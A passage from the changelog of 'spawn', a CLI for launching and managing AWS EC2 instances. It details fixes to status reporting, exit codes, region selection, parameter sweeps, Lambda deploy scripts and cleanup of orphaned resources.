  shutting down — nothing to do"` branch was **unreachable**, because the filter
  that hides the state is the one the lookup uses. It is kept, annotated, since it
  is correct if a caller ever resolves with the all-states filter — and the hint
  now covers the case it was written for.
- **`spawn status` was not read-only: it performed a DNS registration write on
  every invocation** (#733). `spored status` constructed a full agent, and
  `NewAgent` registers DNS as part of construction — an HTTP POST that mutates a
  Route53 record, plus an EC2 tag write via the status recorder. Polling status in
  a loop, which is the normal way to watch a job (and what the demo guide
  instructs presenters to do), therefore generated one control-plane write per
  poll.
  The reported symptom looked cosmetic: spored's initialization lines leaking into
  the status output, with an alarming `Warning: Failed to register DNS: DNS API
  returned HTTP 403` above the summary. But those lines were a *symptom*, and the
  warning was only visible **because the write was failing** — had it succeeded,
  nothing would have printed and the behaviour would still have been wrong.
  `NewAgentForQuery` now builds the agent with **no** side effect: no DNS
  registration, no EBS cost lookup, no job-array registry registration, no
  heartbeat goroutine, no plugin loading, no initialization logging. The five
  non-daemon `spored` subcommands use it — `status`, `reload`, `config get`,
  `config set` and `config list`. The two mutating ones are included on purpose:
  `config set` performs its own intended write and should not also register DNS.
  One constructor with the side effects behind a flag, rather than a parallel
  constructor that would drift. The correct long-term shape is still to split
  construction from a `Start`/`Activate` the daemon calls; this is the narrow
  version of it, and a test asserts the daemon path **still activates**, so the
  fix cannot be mistaken for disabling DNS registration altogether.

- **Declining a confirmation prompt exited 0, so a script could not tell
  "terminated" from "did nothing"** (#737). `spawn terminate <name>` with
  non-interactive stdin printed `Aborted.` and **exited 0** while the instance
  kept running and kept billing — and the only thing distinguishing success from a
  no-op was a line on stderr, which the reporter's output filter hid. An agent or
  CI step checking the exit code concluded the spore was gone and stopped watching.
  A declined prompt now exits **75** (`EX_TEMPFAIL`, "the user is invited to
  retry"). Deliberately not 1: "you said no" and "it failed" need different
  handling, and collapsing them forces a caller to parse text. The messages also
  say what was left undone — `aborted: web-1 (i-abc) is still running` rather than
  `Aborted.` — and a non-interactive prompt is now reported as the **usage error**
  it is ("stdin is not a terminal, so this cannot be answered — pass `--yes`"),
  rather than as a decision somebody made.
  The issue counted eleven such sites. An exhaustive grep found **nineteen**,
  across `terminate` (single and job array), `cleanup`, `cancel`, `state`,
  `arraygroup`, `team`, `stage`, `schedule`, `plugin`, `dns`, `alerts`,
  `autoscale`, `pipeline`, `reaper` and `bot`. All nineteen are converted, and a
  static gate now fails the build if a new one returns success.
  #648's opposite case is unchanged: a *name* that resolves to nothing is still
  success for `terminate`, because the instance is already gone, which is what the
  caller wanted. An abort is the reverse — the instance is definitely still there.
- **`spawn connect <name> -- 'cmd; cmd'` ran the whole string as a command name**
  (#738). A single post-`--` argument was shell-quoted into one word, so the
  remote shell looked for a command literally named `free -m; tail /var/log/x` and
  exited 127 with `No such file or directory` naming the user's entire command.
  This was #369's fix over-correcting: that one was the opposite bug (argv
  re-split by space-joining, so `-- bash -lc "a && b"` left `-c` with no
  argument), and per-argument quoting fixed it at the cost of the command-string
  form. The rule is now explicit on argument count — **one argument is a shell
  command line, several are an argv** — so both work, and both directions are
  pinned by tests since each has now been broken by fixing the other.
  Note this does not match `ssh` exactly, and should not: real `ssh` does no
  quoting at all, which is why `ssh h bash -lc "a && b"` is broken for `ssh` too.
- **`spawn status` reported `CPU: 0.0%` on an instance running at 100%** (#734).
  Three states collapsed into one float, and two of them were sentinels a caller
  could not tell from data: an unreadable `/proc/stat` and a first call with no
  previous sample both returned `100.0` ("assume active"), while a **zero-length
  sample interval** returned `0.0` — the most *reassuring* possible value from a
  no-information state, inconsistent with both its siblings.
  `spored status` hits all of this in one process: it reads CPU once via the idle
  check and again for the report, microseconds apart, against a function that
  overwrites its own previous sample. So the log line said `Not idle: CPU usage
  100.00%` and the summary said `CPU: 0.0%`, on the same instance, in the same
  breath, and neither was a measurement.
  The report now samples **once** and reuses it, an unknown reading is reported as
  `unknown (single sample; assuming active)` instead of a number, the JSON gains
  `cpu_measured` so a consumer cannot plot an assumption, and a zero-length
  interval returns the conservative value like every other unknown branch.
  That last one also mattered beyond the display: the sentinel feeds `isIdle`, so
  the one branch that returned "0% busy" from no information was the branch that
  could have let `--idle-timeout` stop a busy instance. The daemon's ticker spaces
  calls far enough apart that it was not reachable in practice — but one call site
  away from stopping a working box is not a property worth keeping.
- **`spawn status` reported boot time as time spent stopped** (#735). The
  breakdown showed `Elapsed: 22m 13s (20m 0s compute · 2m 13s stopped)` on an
  instance that had **never been stopped**: `stoppedTime` was a *residue* —
  elapsed-since-launch minus compute-since-spored-started — so it absorbed boot,
  cloud-init and package installs, and asserted a specific checkable fact from
  arithmetic that cannot tell being stopped from never having started.
  Boot time is now measured rather than inferred (spored knows both the instance
  launch time and its own start) and reported as its own term, so a slow boot is
  visible in its own right. Stopped time is reported only when there is actual
  evidence of a stop — compute time carried over from a previous run through the
  tag — so a first boot shows `(20m 0s compute · 2m 13s boot)` and claims nothing
  it cannot support.
  `sysReadCPUTimes` is now reached through a package var, because it is
  build-tagged and the darwin implementation always errors — so on the platform
  most development happens on, every branch of the delta logic except the first
  was unreachable and #734 could not be reproduced locally at all.

- **A launch could go silent for six minutes after succeeding, then register no
  DNS** (#740, #741). Reproduced from a goroutine dump: the process sat in
  `registerDNS` → `exec` → `ssh`, SSHing to a host whose SSH port had already
  failed to answer.
  The root cause was that `waitForSSHReady` **returned nothing**, so the timeout
  path and the success path were the same statement and the failure was not
  merely dropped — it was unrepresentable. The caller then marked the step
  complete unconditionally, so an unreachable instance printed
  `✅ Waiting for SSH (120.0s)`: the timeout, to the tenth of a second, rendered
  as success. Nothing downstream noticed either, because the next gate verifies
  spored over **SSM**, which was working — the instance was healthy and the one
  broken thing was the one signal being discarded.
  The probe now returns an error naming the host and the dial failure, the launch
  reports it (non-fatal — the instance is up and spored is enforcing its
  lifecycle) and points at `spawn connect`, which falls back to SSM. Crucially it
  now also **gates** DNS registration, which registers over SSH: that skip already
  existed for `--wait-for-ssh=false`, with the reasoning spelled out in a comment —
  "we cannot and should not register a record pointing at an instance whose
  reachability is unconfirmed" — and was simply unreachable when we *did* wait and
  it failed. A launch with no public IP no longer claims to have checked SSH either.
  Two further fixes in the DNS retry itself. Its four-minute budget was checked
  only *between* attempts, and the exec had no context, so a single `ssh` that
  connected and then hung outlived the deadline entirely (`ConnectTimeout=10`
  caps only the TCP connect). The budget now binds every attempt, and the
  caller's context is threaded through, so a Ctrl-C reaches the child. And the
  retry predicate was `err != nil`, i.e. **every** failure was treated as a
  transient early-boot race — so an unreachable host burned the full four minutes
  on ~16 attempts that could not have succeeded. It now retries the races it was
  written for (`Permission denied` before cloud-init writes `authorized_keys`;
  `curl exit 6/7/28` from an instance whose resolver is not up) and stops on
  reachability failures, while an *unrecognised* message stays retryable so a
  wording we have not seen degrades to the old behaviour rather than giving up early.
- **spawn's longest operations printed nothing while they ran** (#739). An audit
  of every progress-step name passed from `cmd/` found **32 distinct names, of
  which 24 matched nothing** in the tracker's fixed nine-step list — and
  `Start`/`Complete`/`Error`/`Skip` returned *silently* on no match, so all 24
  were no-ops.
  The 24 were not a random sample. They were `Verifying spored agent` (a 5-minute
  wait), `Waiting for Windows (password available)` (12 minutes), every FSx step,
  cohort reconciliation, `Registering DNS`, and the whole Windows ISO→AMI import.
  The eight names that *did* match all belonged to the fast pre-launch phase,
  which is exactly why this went unnoticed: everything that printed finished in
  seconds, and everything slow was invisible. It is why the stall in #740/#741
  showed no output at all.
  A fixed list was the wrong shape to begin with — several steps are conditional
  (FSx, MPI, Windows), and some labels are computed at runtime — so an unknown
  name is now **appended** rather than dropped, and the step list describes what
  the launch actually did. `Error` also prints its message outside the lookup: it
  used to sit *inside* the matched-step branch, so an unregistered name swallowed
  the error text too.
- **A step in flight was invisible on any non-terminal output** (#739). The
  plain-text renderer skipped anything not already `complete` or `error`, so a
  running step emitted — measured — **zero bytes**, and announced itself only once
  it had finished. Piping, capturing or running in CI therefore made a long wait
  and a wedged process identical. Starts are now logged too, once each, and
  `skipped` steps are reported rather than dropped.
  The two longest waits also now state their ceiling (`Verifying spored agent (up
  to 5 min)`), because a bounded wait that says so is a wait, and one that does
  not is indistinguishable from a hang.
- **`launch` ignored `AWS_REGION` and your configured default, and placed
  instances in regions that cannot run the requested instance type** (#732).
  With `AWS_REGION=us-east-1` set and a configured default, launches landed in
  us-west-1 and us-west-2 — neither of which was asked for — and `c8a.large` is
  not offered in us-west-1 at all, so that launch died with EC2's opaque
  `Unsupported: The requested configuration is currently not supported`.
  Two independent causes. `detectBestRegion` took the instance type as a
  parameter and **never referenced it**, ranking purely by measured TCP latency
  and IP geolocation — which also made the choice unstable: across 21 identical
  runs from one machine, 20 picked one region and one picked another, because the
  latency difference between two west-coast endpoints is smaller than the jitter.
  And nothing on the launch path consulted `SPORE_REGION`/`AWS_REGION` or the
  spore config at all, even though the root `--region` flag has always documented
  that precedence: `launch` registers its **own** `--region`, which shadows the
  root one and binds a different variable, so the resolved value was never read.
  Now resolved as **`--region` → `SPORE_REGION`/`AWS_REGION` → spore config →
  auto-detect**, with auto-detect as the last resort rather than the only step,
  and the chosen region is printed with the reason it was chosen ("lowest latency
  of 3 region(s) offering c8g.xlarge, on your continent") so a surprising choice
  is debuggable when it happens instead of three steps later. Auto-detect now
  filters candidates by `DescribeInstanceTypeOfferings`, so a region that cannot
  run the instance is never a candidate; a failed offerings call is treated as
  "offered" rather than excluding the region, because throttling or a missing
  `ec2:DescribeInstanceTypeOfferings` grant says nothing about availability and
  silently narrowing the choice would be worse than degrading to the old ranking.
  **If no region qualifies, the launch now fails and asks for one** instead of
  falling back to `us-east-1` — that default was a guess which could itself not
  offer the type, turning "we could not choose" into a confident wrong choice.
  The precedence lives in a single `resolveLaunchRegion`, because the
  `if region == ""` block it replaces was duplicated at **five** call sites
  (single launch, batch queue, three sweep paths) and fixing one would have left
  four wrong. One of those five also printed its chosen region *before* assigning
  it, so it always announced the empty string.

- **The hand-written Lambda deploy scripts could deploy to the wrong account,
  wipe a function's environment, and report success without verifying anything.**
  Found while preparing the `spawn-sweep-orchestrator` redeploy that #725 needs.
  These functions have **no CloudFormation stack**, so the script is the only
  record of how they are configured, and a defect in one is discovered by running
  it against production — which has happened twice.
  `deploy-sweep-orchestrator.sh` took its account from whatever credentials were
  ambient with no assertion, and sent `--environment "Variables={}"` on **every**
  update, which *replaces* the function's environment with nothing. That is
  indistinguishable from a no-op on a function with no variables set, which is why
  it survived nine months — and it ran under `|| true`, so the wipe could not even
  fail loudly. `deploy-scheduler-handler.sh` had the same `Variables={}` pattern
  and no account assertion.
  Both now assert the target account before building anything (a profile *name* is
  not an account; a profile can be re-pointed), neither passes `Variables={}` at
  all, both are `set -euo pipefail`, and the sweep-orchestrator deploy compares the
  deployed `CodeSha256` against the zip it just built — because an HTTP 200 from
  `update-function-code` says the call was accepted, not that the function runs the
  new binary.
- **A nested Go module could be added and never tested by CI.** The nested-module
  step enumerated `lambda/*` by name, so the `scripts/` module's gates would have
  run nowhere. That scoping was itself the shape of #136 — a module the root
  `go test ./...` cannot reach — one level up, so discovery is now by `find` with
  a guard that fails the build if it matches nothing. (The security workflow
  already discovered modules that way, which is how it caught the first attempt:
  the new module's only package was behind a build tag, so by default it had *no*
  packages and `govulncheck ./...` matched nothing and exited 1. The tag was
  isolating the module from files in its own directory, so it is gone.)

- **A parameter sweep now honours CLI flags instead of dropping them** (#697). The
  sweep dispatch built a two-field `LaunchConfig` — region and instance type — and
  merged param rows onto an *empty* struct, so **every other CLI flag was dropped
  by default**: 83 of 127. A flag worked only if someone had hand-written a shim
  for it, which is why the same class was reported and patched six separate times
  (#525 spend controls, #539 IAM twice, #549 DNS, #667 networking, #673/#674/#675).
  The consequences were not cosmetic. A sweep **could not mount any storage at
  all** — `--efs-id`, all eleven `--fsx-*`, `--attach-volume` — so every row had to
  stage through S3. Every row landed in the VPC default security group even after
  #667 fixed single launches. And `--pre-stop` was dropped, which is the hook that
  syncs results before termination, so losing it loses output.
  The sweep path now calls `buildLaunchConfig` — the same function the
  single-instance path uses — and merges each row *onto* that. The default inverts
  from "drop every flag unless someone wrote a shim" to "honour every flag unless
  the row overrides it". A row's own key still wins, preserving the precedence #539
  established. `buildLaunchConfig`'s validation now applies to sweeps too, which is
  the point rather than a side effect: `--fsx-create` without `--fsx-s3-bucket` was
  previously accepted and ignored on a sweep.
  **84 flags are now honoured, up from 44**, and the known-gap count falls from 58
  to 18 — measured by the coverage manifest rather than asserted.
- **Important scope limit, found by hardware-testing this fix.** The above applies to
  the **foreground** sweep path, reachable only with `--no-detach`. Detached is the
  **default** — `launchParameterSweep` auto-enables it — and a detached sweep is
  launched by the `spawn-sweep-orchestrator` Lambda, which builds `RunInstances`
  from four param keys and never sees a `LaunchConfig` at all. So on the default
  path the drop is closer to 123 of 127, and worse: those rows get no `UserData`
  (hence no spored) and no `spawn:managed` tag (hence no reaper), so nothing can
  stop them. Filed as #725, which is more serious than this issue and not fixed
  here.
- **The 18 remaining gaps are a different, smaller defect**, and the manifest now
  says so instead of lumping them in. They are flags applied *imperatively* later
  in `launchSingleInstance` — `--tag`, `--team`, `--spot-max-price`,
  `--fsx-throughput`, `--allow-cidr`, `--strata-*`, the `--wait-for-*` pair — which
  the sweep dispatch returns before reaching. The inversion fixed every flag the
  config *carries*; nothing about these flows through a config at all.
- **A detached sweep's instances could be stopped by nothing** (#725). Detached is
  the **default** — `launchParameterSweep` auto-enables it — so the common sweep is
  launched by the `spawn-sweep-orchestrator` Lambda, and its rows carried only
  `spawn:sweep-id`, `spawn:sweep-index` and `Name`.
  Two consequences that compounded. No `UserData` meant **no spored**, so no TTL,
  idle or cost enforcement in-instance. And no `spawn:managed` tag meant **the
  reaper could not act either**, because its `ec2:TerminateInstances` grant is
  conditioned on exactly that tag — deliberately, as the rail that keeps it away
  from resources spawn does not own. So neither layer of the lifecycle invariant
  (#70/#72) applied: nothing inside enforced anything and nothing outside was
  permitted to. `--ttl`, `--cost-limit` and `--on-complete` were all accepted and
  none could function.
  Sweep rows now carry `spawn:managed=true`, plus `spawn:ttl-deadline` when the
  sweep has a `ttl` — which the CLI already writes into the param defaults, so
  nothing new had to be plumbed. **This restores the backstop, not in-instance
  enforcement**: a row is now reclaimed on a reaper cycle rather than to the
  minute. That is a different kind of problem from "runs until a human notices",
  and it is the one worth closing first. The `UserData` half needs the full launch
  config to reach the Lambda at all and remains open on #725.
  An absent `ttl` deliberately produces no deadline rather than a guessed one; the
  reaper's own max-age ceiling still bounds the instance, whereas a fabricated
  deadline would terminate work the user never put a clock on.

### Documentation

- **`scripts/hardware-test-detached-sweep.sh`** verifies a detached parameter
  sweep on real hardware: that its rows launch at all (#749), and that they carry
  the `spawn:managed` / `spawn:ttl-deadline` tags which make them reapable
  (#725). It currently **fails**, correctly, on #749 — the CLI does not seed
  `ami` into the params the orchestrator Lambda reads, so every `RunInstances` is
  rejected with `MissingParameter: ImageId` while the Lambda logs "All instances
  launched and completed" and the CLI reports success. The #725 assertions are
  written and waiting behind that.
  Two traps are recorded in the script because both were hit writing it: rows
  must be discovered by `spawn:sweep-id`, never by `Name` (the orchestrator names
  them from a derived `SweepName`, so a filter built from the CLI argument matches
  nothing — which would have made the script's own **cleanup** miss a live row),
  and the orchestrator's log group is in the **infra** account while the rows land
  in the target account, so tailing it with the launch profile returns
  `ResourceNotFoundException` and loses the only diagnostic that explains the
  failure.
- **`lambda/sweep-orchestrator/` is now listed in `scripts/hardware-sensitive.txt`.**
  It composes `RunInstances` from param keys with no compile-time link to the CLI
  that writes them, so no unit test on either side can see a key-set
  disagreement across that seam. Its absence from the manifest is why #749
  shipped.

## [0.124.0] - 2026-10-07

### Added

- **`spawn doctor` now reports the region's Nitro fleet** (#716 follow-on), using the
  generation data truffle v0.58.0 exposes:
  ```
  ✓ Nitro fleet: 154 Nitro families (v6:44 v5:12 v4:53 v3:19 v2:26)   us-east-1
  ✓ Nitro fleet:  70 Nitro families (v6:9 v5:6 v4:28 v3:6 v2:21)      us-west-1
  ```
  This is in `doctor` rather than `launch` because coverage is an **environment**
  fact and it varies a lot — us-west-1 offers under half the Nitro families of
  us-east-1 and a fifth the v6 count, which constrains what you can run there. That
  is the same shape as doctor's other checks: is there a usable subnet, is Session
  Manager reachable, does a reaper cover this account.
  Deliberately **not** on `launch`. The capabilities that matter at launch time —
  EFA, cluster placement, hibernation — are already verified from their own
  authoritative API fields, which beats inferring them from a generation; and an
  ordinary launch makes no capability call at all, so a generation line would add an
  API round-trip to every launch for something most launches never act on.
  It is a **Warn**, never a Fail: every region has some Nitro capacity, so this
  cannot block a launch. The warning fires only when a region's newest generation is
  below v4 — the point where ENA Express and RDMA arrive — and a test asserts a warn
  here still leaves `doctor` exiting 0.
  Unclassified families are counted rather than guessed, since a fabricated
  generation is indistinguishable from a real one downstream. Across us-east-1,
  us-west-1 and eu-central-1 the count is zero, which independently confirms
  truffle's table covers what AWS currently offers.

### Changed

- **Dependencies**: `truffle` v0.53.0 → **v0.58.0**, which brings the Nitro
  generation data and pulls newer AWS SDK minimums with it (`service/ec2` 1.321.1 →
  1.335.0, `sts` 1.45.5 → 1.51.0, `config`, `credentials`, `imds`, `smithy-go`).

### Fixed

- **21 emulator-backed tests across 5 packages passed a fabricated AMI id** and
  broke on the dependency bump above, which moved the substrate test emulator
  v0.97.0 → v0.120.0 transitively. v0.120.0 validates image ids — correctly, since
  real EC2 answers `InvalidAMIID.NotFound` — and the emulator ships with **zero**
  images, so `ami-12345678` had no valid replacement. The tests now register a real
  AMI through `RegisterImage`, which is what a caller would do against EC2, so they
  no longer depend on how lenient the emulator happens to be. Filed upstream as
  substrate#1432, which is a note-and-suggestion rather than a bug report: the new
  strictness is an improvement.
  One test needed more than a new AMI. It asserted that an instance with *no*
  discoverable EBS volumes reports an unmeasured cost fallback (#517), and its own
  comment admitted the premise came from substrate not populating block device
  mappings at all. v0.120.0 populates them and attaches a root volume whether or
  not the AMI declares a root device, so that scenario is unreachable through the
  emulator now. It reaches the same documented fallback deterministically instead —
  which it should have done originally, since it was passing because of something
  substrate had not implemented rather than because of anything spawn did.
  Pure-logic tests were deliberately left using a literal id: a test that never
  calls EC2 should not acquire an emulator dependency.
  Three nested lambda modules also needed their own `go mod tidy` — they pin their
  own dependencies behind a `replace` to the root, so a root bump leaves them stale
  and both the Lambda-modules build and `govulncheck` fail with
  "updates to go.mod needed" rather than anything about a vulnerability.

## [0.123.0] - 2026-10-05

### Added

- **`--command` now announces the shell options it inherits** (#707). It runs with
  **errexit already enabled**, and `set -uo pipefail` does *not* clear it — so a
  script opening with that idiomatic line, believing it chose its own error policy,
  is actually running `-e -u -o pipefail`. The failure mode was silent and actively
  misleading: the script exits *before* the line that would have reported why.
  Two ordinary idioms are the usual casualties. A SIGPIPE'd pipeline under pipefail
  — `... | head -n N` returns 141 — and `wait $pid` on a failed background job,
  which is specifically a pattern for *capturing* a failure and which `-e` destroys
  at the moment it matters. It cost the reporter four `r8gd.8xlarge` runs and three
  misdiagnoses, one of which reached a published page and had to be withdrawn.
  Two lines now land at the top of `/var/log/spawn-command.log`: the actual `$-`, and
  a note that `set -uo pipefail` will not clear errexit and that `set +e` opts out.
  Printed rather than changed, as the reporter suggested: fail-fast is a defensible
  default, and running on after a broken step until TTL would be worse. The
  `--command` help now says all of this too, so it is discoverable before a run
  rather than after one.

- **A Lambda runtime census, gating every PR** (#716). AWS ending support for Python
  3.8 raised the question "are we on a supported runtime anywhere?", and answering it
  took `lambda list-functions` across two accounts and two regions by hand. We were
  never on 3.8 — but two runtimes had been stale since January and nothing could have
  told us. `make lambda-runtimes` now fails if any runtime declared in the repo is not
  on the approved list in `scripts/lambda-runtimes.txt`, and runs in CI with no
  credentials; `make lambda-runtimes-deployed` additionally checks the accounts we own.
  The census scans **three** places, because scanning only `Runtime:` in templates is
  what let the stale one hide: a shell deploy script sets it with `--runtime`, and
  documentation counts too — `examples/workflows/step-functions/README.md` was telling
  users to deploy on `python3.11`, which is advice people act on. That README is fixed.
  A runtime reaching end-of-support should break a build rather than arrive as an
  email, so the allowlist is the thing you edit when a deprecation is published.

### Removed

- **`github-oauth-bridge` and its source** (#716). A Lambda exchanging a GitHub login
  for AWS credentials via STS, deployed January 2026 and superseded by the current
  portal. **Zero invocations on both the function and its API Gateway over 60 days**,
  no page on spore.host referenced its endpoint, and the `spawn-dashboard` Cognito
  pool uses Google and Globus rather than its OIDC issuer — so nothing depended on
  it. Function, API Gateway, IAM role, the role's custom policy, and
  `lambda/github-oauth/` are all gone; the code and config were archived first.
  Its `GITHUB_CLIENT_SECRET` and `JWT_SECRET` sat in plaintext Lambda environment
  variables, and the client id was hardcoded as a default in the source. **Deleting
  the AWS resources does not invalidate the GitHub OAuth app** — that secret stays
  valid until the app is revoked on GitHub.

### Fixed

- **`scheduler-handler` was redeployed onto `provided.al2023`**, and its deploy
  script could never have done it (#716). `update-function-code` does not change a
  runtime, and `--runtime` appeared only in the *create* path — which never runs for
  an existing function. So the script could declare `provided.al2023` and redeploy
  forever while the deployed function stayed on `provided.al2`, which is exactly
  what happened between January and October. The configuration update now carries
  the runtime, and no longer ends in `&>/dev/null || true` — a step that silently
  swallowed failures is a poor place to put the thing you are relying on.
- **The deploy script took its region from `AWS_REGION`** (#716), which is ambient
  and set for whatever you were last doing. Running it with `AWS_REGION=us-west-2`
  left over from unrelated work **created a second `scheduler-handler` in the wrong
  region** instead of updating the real one, and the create path had no wait, so the
  following configuration update failed on a `Creating` function. The region is now
  `us-east-1` — which is what `cmd/schedule.go` hardcodes, so anywhere else is
  unreachable by its only caller — overridable only via the explicit
  `SPAWN_LAMBDA_REGION`, and a mismatched `AWS_REGION` is reported rather than
  obeyed. The create path waits for `function-active-v2`. The stray function was
  deleted.
- **The runtime census claimed a function had no source in the repo** (#716). It
  greps for the function *name*, and `github-oauth-bridge`'s source was
  `lambda/github-oauth/` — byte-identical to the deployed code and newer — because
  the directory is named for the service, not the function. A name grep cannot prove
  absence, so it no longer asserts it: the message now says no file mentions the
  name, and lists `lambda/*/` as candidates to check.

- **`scheduler-handler` was the one Go Lambda still on `provided.al2`** (#716), while
  every other had moved to `provided.al2023`. Its deploy script also omitted
  `CGO_ENABLED=0`, unlike the two beside it — which is the likely reason it stayed
  behind: a CGO build links the build host's glibc, and al2 ships 2.26 against
  al2023's 2.34. Made static first, then bumped, since the order matters. The deploy
  itself is a separate operational step.

## [0.122.0] - 2026-10-05

### Changed

- **EFS is now mounted by the mount-target IP first, with DNS as the fallback**
  (#718). #704 shipped the obvious order — DNS, then the IP — and a hardware smoke
  showed it was backwards. Twice out of three runs a mount target already
  `available` **in the instance's own subnet** produced
  `mount.nfs4: Failed to resolve server` for the entire 60-second retry budget,
  while the same mount by IP succeeded on the first try.
  None of the usual reasons to prefer the name apply here. Encryption in transit
  would need it, since stunnel validates the certificate against the DNS name — but
  spawn has no code path that mounts with TLS: the mount options are a fixed set and
  no `tls` or `iam` key is accepted. fstab surviving a mount-target replacement is
  near worthless for an instance that lives minutes to hours, and had a target
  really been replaced the live mount would already be broken. And DNS's free AZ
  affinity is something spawn already computes deterministically from the instance's
  subnet. So the name cost a minute of boot in the common failure and bought nothing.
  It remains the fallback for when no IP could be resolved — chiefly a caller without
  `elasticfilesystem:DescribeMountTargets` — and it is still what goes in `/etc/fstab`.
  This also closes a verification gap rather than tolerating it: with DNS first, the
  IP path ran *only* when DNS failed, so it was both load-bearing and never
  exercised, and because the failure is intermittent a passing smoke could not prove
  it either way. The primary path now runs on every launch.
- **The EFS user-data block is 51% smaller** (#718). The rationale above was carried
  as comments inside the template, so every byte of it shipped in every instance's
  16 KB user-data budget — 3177 bytes rendered, down to 1566 — for prose cloud-init
  never reads. It now lives on `GenerateStorageUserData` where it costs nothing.

### Fixed

- **`task status` reported every finished task as "running", and `--wait` polled to
  TTL and exited 1 on tasks that had succeeded** (#715). The task id was appended to
  the results key **twice**. `EffectiveResultsPrefix` already ends in the task id, and
  `completionKey` appended it again, so while the wrapper wrote — and spawn printed —
  `tasks/<task_id>/completion.json`, the reader fetched
  `tasks/<task_id>/<task_id>/completion.json` and got a 404, which the read path
  correctly interprets as "no record yet".
  Present since **v0.117.0**, not v0.121.0 as first reported: both halves arrived in
  the same commit (#658), so neither looked wrong alone. That also explains records
  written by older versions being unreadable now — the reader changed, not the writer.
  The cost was not just a wrong exit code. `make run` wraps `task run --wait`, so
  every successful task appeared to fail *and* blocked for the full TTL — 25 minutes
  of wall time per task to learn nothing.
- **A previous attempt's completion record could answer the current run** (#715,
  consequence of the above). `clearStaleCompletion` used the same key builders, so
  the pre-launch clear had been deleting objects that do not exist — and since
  deleting an absent key is a no-op success in S3, it reported success and removed
  nothing. #608's stale-record guard has therefore been inert since v0.117.0, and
  fixing only the read path would have resurrected that bug.
  The task id is no longer a parameter to any of these builders, so the two plausible
  calling conventions that caused this cannot be confused again. The gate is a
  round-trip — the key the reader computes must equal the URI the writer prints —
  because asserting the builder returns an expected string would not have caught it.

- **`spawn orphans` and `spawn cleanup` reported nothing by default** (#708). `--mine`
  filtered on `spawn:iam-user`, a tag spawn writes only to instances and volumes.
  Shared infrastructure — security groups, IAM roles and instance profiles, key pairs,
  log groups, tables — never carries it, and a missing tag reads as `""`, which never
  equals a caller ARN. So for those classes the filter did not *narrow* the result, it
  **emptied** it: `spawn orphans` printed "No orphaned spawn-managed resources" in an
  account holding 27 of them, the oldest from 2026-07-19.
  The rule is now "not someone else's" rather than "provably mine": an untagged
  resource is treated as shared infrastructure and included, while one tagged for a
  different principal is still excluded. Untagged-is-shared rather than
  untagged-is-foreign because it is the only choice that helps the resources already
  out there, and because "mine" is a dubious notion for a security group that is
  deliberately shared and reused by name across runs. `orphans` now also reports how
  many resources the scope excluded, so "nothing here" can never again be the whole
  output when it is not the whole story.
- **Placement groups were reported twice, and one copy silently failed to delete**
  (#713). A **correction to v0.121.0**, which claimed the Resource Groups Tagging API
  "does not return placement groups at all". It does — keyed by group *ID*. The probe
  that claim rested on ran against an account with zero placement groups, so it could
  not tell an unsupported type from an empty result.
  Consequently every managed group appeared twice: once from the tagging API by id
  with no state, once from the dedicated scan by name with one. Worse, the id-keyed
  copy could not be deleted — EC2's `DeletePlacementGroup` takes a *name*, so it
  failed `InvalidPlacementGroup.Unknown`, which the tolerant error check then treated
  as **success**. A `spawn cleanup` in v0.121.0 can therefore report removing a
  placement group it never touched.
  The tagging API's placement-group rows are now dropped in favour of the dedicated
  scan, which supplies both things the other does not: the name needed to delete, and
  whether the group still has members.
- **The smoke's own leak check reported a false pass** (#713, follow-up). The
  teardown and leak check added for the leak above filtered on `spawn-mpi-${TAG}-*`,
  but the MPI job-array name strips hyphens — real groups are
  `spawn-mpi-smoke26176-*`, not `spawn-mpi-smoke-26176-*`. So both matched nothing:
  the teardown deleted nothing and the check printed "no placement groups or
  security groups left behind" over four orphans. The name is now derived once and
  shared by the launch and the teardown, since computing it twice with different
  rules is what allowed the drift. Caught by querying AWS directly instead of
  believing the check — the same reason the leak check exists.
- **`make smoke` leaked the infrastructure it exists to catch leaks of** (#713). The
  MPI leg creates a managed security group and a per-AZ placement group; cleanup
  terminated the instances and left both behind on every run. Three of each
  accumulated over one session — found by `spawn orphans` once the #708 fix above
  made the default scope work, which is a pointed way to learn it. The teardown now
  removes them, retrying the placement-group delete for the same reason spawn itself
  does (termination is asynchronous), and the post-run leak check asks about
  placement groups and security groups rather than only instances, so "no instances
  left behind" can no longer be reported over a pile of litter.
- **`spawn cleanup` offered spawn's own shared IAM identity for deletion** (#713).
  `spored-instance-role` and `spored-instance-profile` are created once and reused by
  every launch, but the only signal the orphan check has for IAM is "is anything
  running" — so an idle account made them orphans and `cleanup --yes` would have
  deleted them. Latent until the #708 fix above: the broken scope had been hiding
  them from cleanup entirely, so one bug was concealing the other. They are now
  reported with the reason and never removed, while per-run
  `spawn-instance-<hash>` profiles stay reclaimable.

## [0.121.0] - 2026-10-05

### Added

- **`spawn orphans` and `spawn cleanup` now see placement groups** (#685). spawn tags
  every cluster placement group it creates with `spawn:managed=true`, but the Resource
  Groups Tagging API — which discovery is built on — does not return placement groups
  at all. So they were invisible to every spawn command: nine orphans in one region of
  one account, and no way to find them except `aws ec2 describe-placement-groups`.
  They are now scanned separately, the same way Elastic IPs are, and reported with
  whether they still have members.
  A group is judged an orphan **per group**, not per region: an MPI cohort creates one
  group per AZ it tries, so a cohort that fell back from one AZ to another leaves the
  abandoned AZ's group genuinely empty *while its own instances are running*. Keying on
  "anything running in this region" — the rule for the shared security group and key
  pair — would have hidden exactly the leak worth finding.
  A group that still has members is reported and skipped rather than offered for
  deletion (EC2 refuses, so attempting it is a wait ending in a failure). It is
  deliberately **not** treated as blocking, either: that would deadlock a group whose
  only members are stopped instances against the very terminate that would free it.
  The sweep needs `ec2:DescribePlacementGroups`, and removing a group needs
  `ec2:DeletePlacementGroup`.

### Fixed

- **A rejected `--mpi` launch created a security group before failing validation**
  (#685). `validateMPIFlags` ran about 286 lines *after* `ensureSecurityGroup` in the
  same function, so `spawn launch x --mpi --count 2` with no `--job-array-name` created
  a managed group, then refused the launch and left the group behind.
  The leftover was named **`spawn-mpi-`** — the prefix with an empty suffix — so every
  such attempt shared one group, and since #659 that group allows **all protocols**
  between its members, which makes accidental sharing materially worse than a naming
  wart. Nothing reaps them (the other half of #685), so each rejected attempt added a
  durable orphan; 19 security groups and 9 placement groups were found in one region of
  a single account, and roughly 35 were cleaned by hand over one session.
  Pure flag validation now runs before the first AWS call, and
  `CreateOrGetMPISecurityGroup` refuses a suffix-less name outright so the shared-group
  case is unreachable from anywhere, not just from the CLI. A gate asserts the ordering,
  since "this happens before that" has no runtime value to assert on.
- **A failed MPI cohort left its placement groups behind, every time** (#685). When a
